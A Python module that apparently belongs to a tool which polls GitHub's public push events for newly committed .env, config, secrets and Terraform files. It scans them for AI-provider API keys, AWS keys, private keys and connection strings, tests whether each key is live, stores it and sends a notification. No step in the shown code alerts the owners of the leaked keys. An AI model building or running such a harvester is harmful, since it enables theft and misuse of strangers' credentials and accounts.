"""
GitHub Events API scanner — catches newly pushed config/env files.

Why Events alongside Code Search:
  - Code search index has 30s-6h lag; Events API shows pushes within one poll window
  - Different source: repos that never rank in search appear here
  - Shares existing token pool (core quota, NOT search quota) — zero extra accounts needed
  - ETag caching: 304 responses don't count against rate limits

Architecture:
  - One worker per GitHub token, each worker owns a slice of /events pages (1-10)
  - ETag per (token, page): if event stream unchanged → 304, no quota used
  - X-Poll-Interval header respected (GitHub may increase it under load)
  - Dedup via try_claim_file(sha256("event:{repo}:{commit_sha}:{path}"))

Rate budget (9 tokens, 60s poll):
  - 9 req/min for event polling = 540 req/hour out of 45,000 available (1.2%)
  - File fetches: ~1-5% of push events touch watched filenames → ~5-20 req/hour extra
"""

import asyncio
import base64
import hashlib
import logging

import httpx

import db
from config import GITHUB_TOKENS
from patterns import EXTRACTORS, is_skippable_path
from infra_patterns import INFRA_EXTRACTORS, assess_risk, extract_destination
from validators import validate
from notifier import notify_found, notify_infra_found

log = logging.getLogger(__name__)

_BASE = "https://api.github.com"
_DEFAULT_POLL_INTERVAL = 60   # seconds; overridden by X-Poll-Interval header
_TOTAL_PAGES           = 10   # GitHub /events has max 10 pages

_LIMITS = httpx.Limits(
    max_connections=30,
    max_keepalive_connections=10,
    keepalive_expiry=30,
)

# Leaf filenames and full paths worth fetching from push events.
# Keep in sync with gitee_scanner._TARGET_PATHS.
_WATCH_NAMES: frozenset[str] = frozenset({
    ".env", ".env.local", ".env.example", ".env.production",
    ".env.development", ".env.staging", ".env.backup",
    ".env.dev", ".env.test", ".env.qa",
    "config.py", "settings.py", "api_config.py",
    "config.yaml", "config.yml", "config.json", "config.toml",
    "config.ts", "config.js",
    "docker-compose.yml", "docker-compose.yaml",
    "application.yml", "application.yaml", "application.properties",
    "application-dev.yml", "application-prod.yml", "bootstrap.yml",
    "appsettings.json", "appsettings.Development.json",
    "llm_config.yaml", "model_config.json",
    "main.yml", "ci.yml", "deploy.yml",  # CI workflow leaf names
    "Makefile",
    # Explicit secret/credential files
    "secrets.py", "secrets.js", "secrets.yaml", "secrets.json",
    "credentials.json", "credentials.py",
    "keys.py", "keys.js", "keys.yaml",
    # Helm / k8s values (often contain AI provider keys injected via env)
    "values.yaml", "values-dev.yaml", "values-prod.yaml",
    "values-staging.yaml", "values-production.yaml",
    # Terraform
    "terraform.tfvars", "variables.tfvars",
})

_AI_TRIGGER = (
    "sk-", "AIzaSy", "eyJ",
    "hf_", "pplx-", "xai-", "r8_",
    "ZHIPUAI", "zhipuai", "moonshot", "MOONSHOT",
    "klingai", "KLINGAI", "KLING_",
    "DEEPSEEK", "deepseek",
    "ARK_API", "ark_api", "DOUBAO", "doubao",
    "VOLCSTACK", "VOLCENGINE_API", "VOLC_ACCESSKEY",
    "gsk_",                     # Groq AI
    "fw_",                      # Fireworks AI
    "sk-or-v1",                 # OpenRouter
    "FIREWORKS", "fireworks",   # Fireworks context
    "OPENROUTER", "openrouter", # OpenRouter context
    "MISTRAL", "mistral",       # Mistral AI
    "COHERE", "cohere",         # Cohere
)
_INFRA_TRIGGER = (
    "://", "BEGIN PRIVATE KEY", "BEGIN RSA", "BEGIN OPENSSH",
    "AKIA", "AIPA", "AIDA", "AROA", "ASIA",
)


def _headers(token: str) -> dict:
    return {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "ghscan-events/1.0",
    }


def _claim_key(full_name: str, commit_sha: str, path: str) -> str:
    return hashlib.sha256(
        f"event:{full_name}:{commit_sha}:{path}".encode()
    ).hexdigest()[:40]


def _is_watched(path: str) -> bool:
    """True if this file path should be fetched from a push event."""
    leaf = path.rsplit("/", 1)[-1]
    return leaf in _WATCH_NAMES or path in _WATCH_NAMES


async def _fetch_file(client: httpx.AsyncClient,
                      full_name: str, path: str, ref: str,
                      token: str) -> str | None:
    """Fetch file content at a specific commit ref."""
    try:
        r = await client.get(
            f"{_BASE}/repos/{full_name}/contents/{path}",
            headers=_headers(token),
            params={"ref": ref},
            timeout=10,
        )
        if r.status_code != 200:
            return None
        data = r.json()
        enc = data.get("encoding", "")
        raw = data.get("content", "")
        if enc == "base64" and raw:
            return base64.b64decode(raw).decode("utf-8", errors="replace")
        return raw or None
    except Exception as e:
        log.debug("events get_file [%s/%s@%s]: %s", full_name, path, ref[:7], e)
        return None


async def _scan_content(full_name: str, path: str, content: str, file_url: str):
    """Run AI + infra extractors on content and persist findings."""
    has_ai    = any(t in content for t in _AI_TRIGGER)
    has_infra = any(t in content for t in _INFRA_TRIGGER)
    if not has_ai and not has_infra:
        return

    if has_ai:
        for prov, fn in EXTRACTORS.items():
            for key in fn(content):
                if db.key_exists(key):
                    continue
                is_valid = await validate(prov, key)
                saved = db.save_key(
                    prov, key, full_name, path, file_url,
                    0, "", "events", is_valid,
                )
                if saved:
                    await notify_found(
                        prov, key, full_name, path, file_url,
                        0, "", "events", is_valid,
                    )
                    log.info("[events %s] %s from %s/%s",
                             "VALID" if is_valid else "found", prov, full_name, path)

    if has_infra:
        risk_cache = None
        for iprov, ifn in INFRA_EXTRACTORS.items():
            creds = ifn(content)
            if not creds:
                continue
            if risk_cache is None:
                risk_cache = assess_risk(content, path, 0, "")
            risk_level, risk_reasons = risk_cache
            for cred in creds:
                if db.infra_exists(cred):
                    continue
                destination = extract_destination(cred) if "://" in cred else ""
                db.save_infra(
                    iprov, cred, full_name, path, file_url,
                    0, "", "events", destination, risk_level, risk_reasons,
                )
                await notify_infra_found(
                    iprov, cred, full_name, path, file_url,
                    0, "", "events", destination, risk_level, risk_reasons,
                )


async def _process_push_event(client: httpx.AsyncClient, event: dict, token: str):
    """Scan relevant files from a single PushEvent."""
    full_name = event.get("repo", {}).get("name", "")
    if not full_name:
        return

    for commit in event.get("payload", {}).get("commits", []):
        commit_sha = commit.get("sha", "")
        if not commit_sha:
            continue

        changed = commit.get("added", []) + commit.get("modified", [])
        relevant = [p for p in changed if _is_watched(p) and not is_skippable_path(p)]
        if not relevant:
            continue

        for path in relevant:
            ck = _claim_key(full_name, commit_sha, path)
            if not db.try_claim_file(ck):
                continue
            content = await _fetch_file(client, full_name, path, commit_sha, token)
            if not content:
                continue
            file_url = f"https://github.com/{full_name}/blob/{commit_sha}/{path}"
            await _scan_content(full_name, path, content, file_url)


async def _poll_page(
    client: httpx.AsyncClient,
    token: str,
    page: int,
    etag: str,
) -> tuple[list[dict], str, int]:
    """Poll /events?page=N with ETag caching.

    Returns (events, new_etag, poll_interval_seconds).
    Empty list on 304 (nothing new) or error.
    """
    hdrs = dict(_headers(token))
    if etag:
        hdrs["If-None-Match"] = etag

    try:
        r = await client.get(
            f"{_BASE}/events",
            headers=hdrs,
            params={"page": page, "per_page": 100},
            timeout=15,
        )
        poll_interval = int(r.headers.get("X-Poll-Interval", _DEFAULT_POLL_INTERVAL))

        if r.status_code == 304:
            return [], etag, poll_interval

        if r.status_code in (401, 403):
            log.warning("[events] token %s... dead/forbidden", token[:8])
            return [], etag, poll_interval

        if r.status_code == 422:
            # Page out of range — GitHub returns 422 for page > max
            return [], etag, poll_interval

        if r.status_code != 200:
            log.debug("[events] poll status=%d page=%d", r.status_code, page)
            return [], etag, poll_interval

        new_etag = r.headers.get("ETag", etag)
        events   = r.json()
        if not isinstance(events, list):
            return [], new_etag, poll_interval

        return events, new_etag, poll_interval

    except Exception as e:
        log.debug("[events] poll exception page=%d: %s", page, e)
        return [], etag, _DEFAULT_POLL_INTERVAL


async def _events_worker(token: str, pages: list[int], worker_id: int):
    """Poll assigned /events pages, process PushEvents indefinitely."""
    log.info("[events w%d token=%s...] pages=%s", worker_id, token[:8], pages)

    etags: dict[int, str] = {p: "" for p in pages}
    poll_interval = _DEFAULT_POLL_INTERVAL

    async with httpx.AsyncClient(follow_redirects=True, limits=_LIMITS) as client:
        while True:
            try:
                for page in pages:
                    events, etags[page], pi = await _poll_page(
                        client, token, page, etags[page]
                    )
                    poll_interval = pi

                    push_events = [e for e in events if e.get("type") == "PushEvent"]
                    if push_events:
                        log.debug("[events w%d] page=%d → %d push events",
                                  worker_id, page, len(push_events))
                    for ev in push_events:
                        try:
                            await _process_push_event(client, ev, token)
                        except Exception as e:
                            log.debug("[events w%d] process err: %s", worker_id, e)

            except Exception as e:
                log.error("[events w%d] loop err: %s", worker_id, e)

            await asyncio.sleep(poll_interval)


async def events_loop():
    """Start one worker per token. Distribute /events pages across workers."""
    if not GITHUB_TOKENS:
        return

    n = len(GITHUB_TOKENS)

    # Round-robin page → token assignment
    # e.g. 9 tokens × 10 pages: tokens 0-8 get 1-2 pages each
    page_chunks: list[list[int]] = [[] for _ in range(n)]
    for p in range(1, _TOTAL_PAGES + 1):
        page_chunks[p % n].append(p)

    workers = [
        asyncio.create_task(
            _events_worker(GITHUB_TOKENS[i], page_chunks[i], i),
            name=f"events_w{i}",
        )
        for i in range(n)
        if page_chunks[i]  # skip empty (only possible if n > _TOTAL_PAGES)
    ]

    log.info("events scanner started | %d workers | %d pages | ~%ds poll",
             len(workers), _TOTAL_PAGES, _DEFAULT_POLL_INTERVAL)

    results = await asyncio.gather(*workers, return_exceptions=True)
    for r in results:
        if isinstance(r, Exception):
            log.error("events worker crashed: %s", r)


# ── Local smoke test ──────────────────────────────────────────────────────────
# Run: python events_scanner.py
# Polls page 1 once, prints PushEvents with relevant files. No DB writes.
if __name__ == "__main__":
    import os, sys, json

    logging.basicConfig(level=logging.DEBUG,
                        format="%(asctime)s %(levelname)s: %(message)s")

    token = os.environ.get("GITHUB_TOKEN") or (
        GITHUB_TOKENS[0] if GITHUB_TOKENS else ""
    )
    if not token:
        print("Set GITHUB_TOKEN env var"); sys.exit(1)

    async def _smoke():
        async with httpx.AsyncClient(follow_redirects=True) as c:
            events, etag, pi = await _poll_page(c, token, page=1, etag="")
            print(f"ETag: {etag}  X-Poll-Interval: {pi}s  Events: {len(events)}")

            push_events = [e for e in events if e.get("type") == "PushEvent"]
            print(f"PushEvents: {len(push_events)}")

            hits = 0
            for ev in push_events:
                full_name = ev.get("repo", {}).get("name", "")
                for commit in ev.get("payload", {}).get("commits", []):
                    changed = commit.get("added", []) + commit.get("modified", [])
                    relevant = [p for p in changed if _is_watched(p)]
                    if relevant:
                        hits += 1
                        print(f"  HIT: {full_name} commit={commit['sha'][:7]} "
                              f"files={relevant}")

            print(f"\nTotal hits (watched files in push events): {hits}")

            # ETag test: second request should return 304
            events2, etag2, _ = await _poll_page(c, token, page=1, etag=etag)
            print(f"ETag re-request: {len(events2)} events "
                  f"({'304 as expected' if not events2 else 'GOT DATA - etag not respected'})")

    asyncio.run(_smoke())
